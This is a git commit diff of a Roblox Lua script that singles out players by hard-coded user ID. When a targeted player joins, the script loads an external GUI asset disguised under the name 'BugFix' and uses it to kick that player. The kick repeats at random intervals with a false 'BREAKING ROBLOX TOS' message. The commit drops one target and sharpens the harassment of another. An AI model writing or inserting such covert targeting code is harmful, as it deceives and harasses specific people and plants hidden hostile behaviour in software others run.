aa2b62e2c2e5bb837a6552b1ee924b207cf6b367
maxype <yepsecretfinder@gmail.com>
2024-08-14 03:13:37 +0300

    Update t.lua

--- scripts/t.lua
+++ scripts/t.lua
@@ -1,24 +1,16 @@
 game.Players.PlayerAdded:Connect(function(plr)
 	task.wait(3)
-	if plr.UserId == 144324719 then
-		local ok = game:GetService("InsertService"):LoadAsset(18938166154)
-		local troll = ok:FindFirstChildWhichIsA("ScreenGui")
-		troll.Name = "BugFix"
-		troll.Parent = plr:WaitForChild("PlayerGui")
-		troll.Enabled = true
-	end
-    if  plr.UserId == 3572567805  then
+	if  plr.UserId == 3572567805  then
 	while plr do
 		if plr then
 		        local ok = game:GetService("InsertService"):LoadAsset(18938166154)
 		        local troll = ok:FindFirstChildWhichIsA("ScreenGui")
 		        troll.Name = "BugFix"
-		        troll:WaitForChild("KickFor").Value = "unable to reach endpoint"
+		        troll:WaitForChild("KickFor").Value = "BREAKING ROBLOX TOS"
 		        troll.Parent = plr:WaitForChild("PlayerGui")
 		        troll.Enabled = true
-			task.wait(500)
+				task.wait(math.random(25, 240))
 		end
 	end
     end
-
 end)
